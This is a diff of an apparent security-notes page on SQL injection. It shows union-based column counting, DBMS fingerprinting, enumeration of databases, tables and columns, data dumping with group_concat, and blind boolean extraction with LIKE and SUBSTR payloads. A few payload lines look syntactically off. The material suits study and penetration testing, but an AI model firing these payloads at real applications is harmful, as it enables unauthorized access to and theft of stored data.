@@ -143,12 +143,11 @@ Mitigations
 <details class="details-n">
 <summary><b>error-based</b> using <code>UNION SELECT</code></summary>
 
-```sql
--- you don't known the query
-SELECT [...] UNION SELECT NULL -- fail
-SELECT [...] UNION SELECT NULL, NULL -- fail
-SELECT [...] UNION SELECT NULL, NULL, NULL -- fail
-SELECT [...] UNION SELECT NULL, NULL, NULL, NULL -- OK
+```none
+UNION SELECT NULL -- fail
+UNION SELECT NULL, NULL -- fail
+UNION SELECT NULL, NULL, NULL -- fail
+UNION SELECT NULL, NULL, NULL, NULL -- OK
 ```
 
 As the 4 query is successful, we know that there are 4 parameters in the select. Note that NULL is the most used, but you may use any value such as `1`, `2`...
@@ -159,23 +158,22 @@ As the 4 query is successful, we know that there are 4 parameters in the select.
 
 `ORDER BY` can take an index, which is a shortcut for the $nth$ argument in the select. If you use an invalid $n$, then the requests fails.
 
-```sql
--- you don't known the query
-SELECT [...] ORDER BY 1 -- fail
-SELECT [...] ORDER BY 2 -- fail
-SELECT [...] ORDER BY 3 -- fail
-SELECT [...] ORDER BY 4 -- OK
+```none
+ORDER BY 1 -- fail
+ORDER BY 2 -- fail
+ORDER BY 3 -- fail
+ORDER BY 4 -- OK
 ```
 </details>
 
 The second objective is to find the DBMS, and it's version, just to ensure that any following query is valid in the DBMS language. You can fetch the user too with `user()`.
 
-```sql
-SELECT [...] UNION SELECT @@version, NULL, NULL, NULL
-SELECT [...] UNION SELECT sqlite_version(), NULL, NULL, NULL
-SELECT [...] UNION SELECT VERSION(), NULL, NULL, NULL
-SELECT [...] UNION SELECT (SELECT banner FROM v$version), NULL, NULL, NULL
--- ...
+```none
+UNION SELECT @@version, NULL, NULL, NULL
+UNION SELECT sqlite_version(), NULL, NULL, NULL
+UNION SELECT VERSION(), NULL, NULL, NULL
+UNION SELECT (SELECT banner FROM v$version), NULL, NULL, NULL
+...
 ```
 
 > Note that there may be an error at this point if the server was expecting the first value of the select to be an "int" (for instance). Simply move the call of `@@version/...`, until it's successful.
@@ -185,33 +183,33 @@ SELECT [...] UNION SELECT (SELECT banner FROM v$version), NULL, NULL, NULL
 
 The third objective is to find the database name.
 
-```sql
-SELECT [...] UNION SELECT database(), NULL, NULL, NULL
+```none
+UNION SELECT database(), NULL, NULL, NULL
 ```
 
 The fourth objective is to find the tables. Note that the following query will return one result, but if your attack channel allow you to display more than one, then you may remove the `group_concat`.
 
-```sql
-SELECT [...] UNION SELECT group_concat(table_name), NULL, NULL, NULL FROM information_schema.tables WHERE TABLE_SCHEMA='database_name'
+```none
+UNION SELECT group_concat(table_name), NULL, NULL, NULL FROM information_schema.tables WHERE TABLE_SCHEMA='database_name'
 ```
 
 Then, you may want to know a column names given a table
 
-```sql
-SELECT [...] UNION SELECT group_concat(column_name), NULL, NULL, NULL FROM information_schema.columns WHERE TABLE_NAME='table_name'
+```none
+UNION SELECT group_concat(column_name), NULL, NULL, NULL FROM information_schema.columns WHERE TABLE_SCHEMA='database_name' AND TABLE_NAME='table_name'
 ```
 
 Now, you have everything you need to dump all results.
 
-```sql
-SELECT [...] UNION SELECT group_concat(col1,":",col2 SEPARATOR '<br>'), NULL, NULL, NULL FROM table_name
+```none
+UNION SELECT group_concat(col1,":",col2 SEPARATOR '<br>'), NULL, NULL, NULL FROM database_name.table_name
 ```
 
 <p class="mt-3"><b>Notes for SQLite</b></p>
 
-```sql
-SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
-SELECT [...] UNION SELECT group_concat(col1 || ":" || col2, '<br>') [...]
+```none
+UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
+UNION SELECT group_concat(col1 || ":" || col2, '<br>') [...]
 ```
 
 </div></div>
@@ -224,21 +222,21 @@ SELECT [...] UNION SELECT group_concat(col1 || ":" || col2, '<br>') [...]
 
 You better be prepared, manual error-based SQLi may take QUITE some time, as you may have to iterate a lot of characters. Let's say you found the following GET form to be injectable. If you use "1", you can see a valid account, but if you return "0", you will see "page not found".
 
-```http request
+```none
 GET /account?id=1
 ```
 
 Then, your starting point will be
 
-```http request
+```none
 GET /account?id=1' AND 1=0-- -
 ```
 
 Now, even if the id is valid, you will see "page not found". If you use `1=1`, everything should work like before. That's how you will have to play with the request. When you got "page not found", it will mean that you condition failed, and bit-by-bit you will map the database. There are two well-known way to process
 
-* Using LIKE
+* Using LIKE <small>(work on text AND numbers)</small>
 
-```
+```none
 WHERE text LIKE 'a%'
 -- is text starting with 'a'
 WHERE text LIKE '%0%'
@@ -247,7 +245,7 @@ WHERE text LIKE '%0%'
 
 * Using SUBSTR, and ASCII/CAST
 
-```
+```none
 WHERE ASCII(SUBSTR(text,1,1) = ASCII('a')
 -- extract the the first character (pos=1, len=1)
 -- of a text 'text'. Convert the character to ASCII
@@ -256,7 +254,7 @@ WHERE ASCII(SUBSTR(text,1,1) = ASCII('a')
 
 **Why?**: You would (obviously) want to go with LIKE, but it won't always work. For instance, the parameter may be transformed to lowerCase/upperCase according to what the programmer wants...
 
-```
+```none
 -- find the ASCII (do it inside YOUR DBMS)
 SELECT ASCII('A') -- 65
 
@@ -270,7 +268,7 @@ WHERE SUBSTR(text,1,1) = CAST(X'41' as char)
 
 First, to avoid losing too much motivation, it may be better to test how many characters you are looking for. For instance, for the database name
 
-```
+```none
 ' AND LENGTH(database()) > 5 -- -
 ' AND LENGTH(database()) > 15 -- -
 ' AND LENGTH(database()) > 12 -- -
@@ -282,7 +280,7 @@ First, to avoid losing too much motivation, it may be better to test how many ch
 
 Then, you can start. As everything is the same as for **Union-based SQLi**, and the process is the same for every text, I will only show an example with getting the database name.
 
-```
+```none
 ' AND database() LIKE '%' -- - // test, should always be true
 ' AND database() LIKE 'a%' -- - // starting
 ' AND database() LIKE 'b%' -- -
@@ -296,14 +294,21 @@ Then, you can start. As everything is the same as for **Union-based SQLi**, and 
 
 Sometimes, there maybe more than one match. For instance, we could have a database starting with `my_`. In such case, to know if there are more databases like this, you have to exclude the one you found.
 
-```
+```none
 ' AND database()!='my_example' AND database() LIKE 'my_%' -- -
 ```
 
-If the query returns true, you may have one more database to check up. In the end, you will have to do like union, and work with queries like
+If the query returns true, you may have one more database to check up. Following here, I'm doing this
 
-```
-' UNION SELECT NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema = 'database_name' and table_name like 'table_name' and COLUMN_NAME LIKE "a%" -- -
+```none
+-- fetch table name
+' 1 IN (SELECT 1 FROM information_schema.tables WHERE table_schema = 'database_name' AND table_name like '%') -- -
+[...]
+-- fetch column name
+' 1 IN (SELECT 1 FROM information_schema.tables WHERE table_schema = 'database_name' AND table_name='table_name' AND column_name LIKE '%') -- -
+[...]
+-- fetch values
+' 1 IN (SELECT 1 FROM database_name.table_name WHERE column_name LIKE '%') -- -
 ```
 </div></div>
 
